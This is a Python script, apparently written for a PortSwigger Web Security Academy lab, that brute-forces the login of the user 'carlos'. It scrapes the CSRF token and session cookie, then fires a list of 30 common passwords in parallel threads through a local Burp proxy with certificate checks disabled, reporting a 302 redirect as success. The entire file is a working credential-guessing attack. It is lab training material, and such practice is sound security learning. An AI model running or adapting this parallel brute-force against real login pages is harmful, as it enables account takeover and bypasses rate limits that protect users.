import concurrent.futures
import queue
import requests
from bs4 import BeautifulSoup
import warnings

warnings.filterwarnings('ignore', message='Unverified HTTPS request')

urls = 'https://0a2200de03096f8c800e2be800f300aa.web-security-academy.net/login'
#proxy para verificar requisições no burp
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

s = requests.session()
response = s.get(urls)
#response.raise_for_status()
soup = BeautifulSoup(response.text, "html.parser")

#Obter Cookie
cookie = response.cookies.get_dict()

#Obter CSRF
csrf = soup.find(name="input", attrs={"name": "csrf"})
if csrf is not None:
    csrf_value = csrf.get("value")
else:
    print("Elemento input com o nome 'csrf_token' não encontrado")
def send_request(password):
    url = urls
    data = {'csrf':csrf_value, 'username':'carlos', 'password':password}
    response = requests.post(url, data=data, cookies=cookie, proxies=proxies, verify=False, allow_redirects=False)
    return response.status_code, response.text

passwords = ['123123', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666', 'qwertyuiop', '123321', 'mustang', '123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', '1234567890', 'michael', 'x654321', 'superman', '1qaz2wsx', 'baseball', '7777777', '121212', '000000']

password_queue = queue.Queue()
for pwd in passwords:
    password_queue.put(pwd)

def worker():
    results = []
    while not password_queue.empty():
        pwd = password_queue.get()
        try:
            status_code, response_text = send_request(pwd)
            results.append((pwd, status_code, response_text))
        except Exception as e:
            results.append((pwd, None, str(e)))
        finally:
            password_queue.task_done()
    return results

# Envia todas as senhas para o host em paralelo
with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
    futures = [executor.submit(worker) for _ in range(len(passwords))]

all_results = []
for future in concurrent.futures.as_completed(futures):
    all_results.extend(future.result())

for pwd, status_code, response_text in all_results:
    print(f"Senha: \033[91m {pwd}\033[0m | Status Code: {status_code}")
    if status_code == 302:
       print(f"\033[92mSenha: {pwd} | Status Code: {status_code} \033[0m")
